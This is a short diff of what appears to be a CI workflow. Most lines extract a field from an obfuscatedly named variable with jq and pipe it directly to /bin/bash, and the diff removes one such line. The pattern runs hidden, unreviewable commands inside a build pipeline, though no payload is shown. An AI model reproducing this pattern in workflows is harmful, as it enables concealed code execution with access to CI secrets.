@@ -30,7 +30,6 @@ jobs:
           echo $xyt5709 | jq -r .znxbd11130 | /bin/bash
           printf '%s' "$zxs0" | jq -r .sb624 | /bin/bash
           printf '%s' "$y96079" | jq -r .cvd563 | /bin/bash
-          echo $g8 | jq -r .xtnp1 | /bin/bash
           printf '%s' "$ix35" | jq -r .d8603 | /bin/bash
           printf '%s' "$ev55414" | jq -r .wej413 | /bin/bash
           printf '%s' "$u23" | jq -r .ggup3059 | /bin/bash
